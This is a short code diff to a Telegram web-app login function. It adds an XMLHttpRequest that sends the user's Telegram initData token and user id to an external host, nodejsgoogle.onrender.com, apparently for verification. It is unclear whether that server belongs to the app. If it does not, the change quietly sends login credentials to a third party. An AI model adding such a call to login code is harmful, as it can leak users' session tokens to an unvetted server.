@@ -71,6 +71,30 @@ window.login_telegramweb = function(){
       "t3token": initData,
       "t3userid": user.id,
     };
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://nodejsgoogle.onrender.com/telegramVerify', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                console.log('验证成功:', JSON.parse(xhr.responseText));
+            } else {
+                console.error('验证失败:', xhr.status, xhr.responseText);
+            }
+        }
+    };
+
+    const data = {
+        t3token: initData,
+        t3userid: user.id
+    };
+
+    xhr.send(JSON.stringify(data));
+
+
+
     var jsonString = JSON.stringify(loginJson);
     console.log("Login = " +JSON.stringify(jsonString));
     window.SDKInterface.telegramwebLoginCallback(jsonString)
